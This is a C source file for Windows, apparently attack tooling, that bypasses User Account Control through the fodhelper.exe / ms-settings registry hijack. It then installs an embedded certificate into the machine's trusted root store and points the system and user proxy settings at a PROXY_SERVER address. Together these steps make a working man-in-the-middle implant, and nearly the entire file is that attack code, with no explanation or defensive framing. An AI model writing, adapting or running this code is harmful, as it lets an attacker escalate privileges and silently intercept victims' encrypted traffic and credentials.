#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>

BOOL installProxy(char *proxyAddr){
    HKEY hk;
    long lret = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", 0, KEY_WRITE|KEY_SET_VALUE|KEY_WOW64_64KEY, &hk);
    if (lret != ERROR_SUCCESS && hk != NULL){
        printf("Error opening HKLM key %d", lret);
        return 0;
    }
    lret = RegSetValueExA(hk, "ProxyServer", 0, REG_SZ, proxyAddr, strlen(proxyAddr));
    if (lret != ERROR_SUCCESS){
        printf("Error setting HKLM server: %d", lret);
        return 0;
    }
    DWORD dwEnable = 1;
    lret = RegSetValueExA(hk, "ProxyEnable", 0, REG_DWORD, (const BYTE*)&dwEnable, sizeof(dwEnable));
    if (lret != ERROR_SUCCESS){
        printf("Error setting HKLM value %d", lret);
        return 0;
    }
    RegCloseKey(hk);
    SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL);
    lret = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", 0, KEY_WRITE|KEY_SET_VALUE, &hk);
    if (lret != ERROR_SUCCESS && hk != NULL){
        printf("Error opening key %d", lret);
        return 0;
    }
    lret = RegSetValueExA(hk, "ProxyServer", 0, REG_SZ, proxyAddr, strlen(proxyAddr));
    if (lret != ERROR_SUCCESS){
        printf("Error setting server: %d", lret);
        return 0;
    }
    lret = RegSetValueExA(hk, "ProxyEnable", 0, REG_DWORD,(const BYTE*)&dwEnable, sizeof(dwEnable));
    if (lret != ERROR_SUCCESS){
        printf("Error setting value %d", lret);
        return 0;
    }
    SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL);
}

BOOL installCert(BYTE *data, DWORD size){
    HCERTSTORE hRootCertStore = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, 0, CERT_SYSTEM_STORE_LOCAL_MACHINE | CERT_STORE_OPEN_EXISTING_FLAG , L"ROOT");
    if (hRootCertStore == NULL){
        printf("Failed to open cert store");
        DWORD err = GetLastError();
        printf("Error : %x", err);
        return 0;
    }
    struct _CRYPTOAPI_BLOB pblob;
    pblob.pbData = data;
    pblob.cbData = size;
    HCERTSTORE pTempStore = PFXImportCertStore(&pblob, NULL, PKCS12_NO_PERSIST_KEY);
    if (pTempStore == NULL){
        printf("Failed to open p12 cert\n");
        DWORD err = GetLastError();
        printf("Error : %x", err);
        return 0;
    }
    PCCERT_CONTEXT pCert = CertEnumCertificatesInStore(pTempStore, NULL);
    if(pCert == NULL){
        printf("Failed to retrieve cert\n");
        DWORD err = GetLastError();
        printf("Error : %x", err);
        return 0;
    }
    if (!CertAddCertificateContextToStore(hRootCertStore, pCert, CERT_STORE_ADD_NEW, NULL)){
        printf("Failed to add cert to store\n");
        DWORD err = GetLastError();
        printf("Error : %x", err);
        return 0;
    }
    CertCloseStore(hRootCertStore, 0);
}

DWORD initRsc(BYTE **resource){
    HRSRC hObj = FindResource(NULL,MAKEINTRESOURCE(0),RT_RCDATA);
    HGLOBAL hRes = LoadResource(NULL,hObj);
    BYTE *lpBin = (BYTE*)LockResource((unsigned char*)hRes);
    DWORD dwSize = SizeofResource(NULL,hObj);
    BYTE* pBytes = HeapAlloc(GetProcessHeap(), 0, dwSize);
    ZeroMemory(pBytes, dwSize);
    int failed = memcpy_s(pBytes, dwSize, lpBin, dwSize);
    FreeResource(hObj);
    if(failed){
        printf("Failed to copy data!\nError: %d\n",failed);
        return 0;
    }
    *resource = pBytes;
    return dwSize;
}

int isElevated() {
    HANDLE hToken = NULL;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
    DWORD size = 0;
    TOKEN_ELEVATION elevationType;
    GetTokenInformation(hToken, TokenElevation, &elevationType, sizeof(elevationType), &size);
    CloseHandle(hToken);

    return elevationType.TokenIsElevated;
}

int elevateProcess() {
    HKEY hKey;
    char payload[270];
    char szFileName[260];
    GetModuleFileName(NULL, szFileName, MAX_PATH);
    sprintf_s(payload, sizeof(payload), "%s %s", "cmd.exe /c start", szFileName);
    if (RegCreateKeyA(HKEY_CURRENT_USER, "SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command", &hKey)) {
        printf("Could not create registry key!");
        return -1;
    }

    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, NULL, 0);
    RegSetValueExA(hKey, NULL, 0, REG_SZ, payload, strlen(payload));
    PVOID OldValue;
    Wow64DisableWow64FsRedirection(&OldValue);

    ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_HIDE);

    return 0;
}

int main(){
    if(!isElevated()) {
        elevateProcess();
        return 0;
    }

    PBYTE rscData;
    DWORD size = initRsc(&rscData);
    installCert(rscData, size);
    installProxy(PROXY_SERVER);
}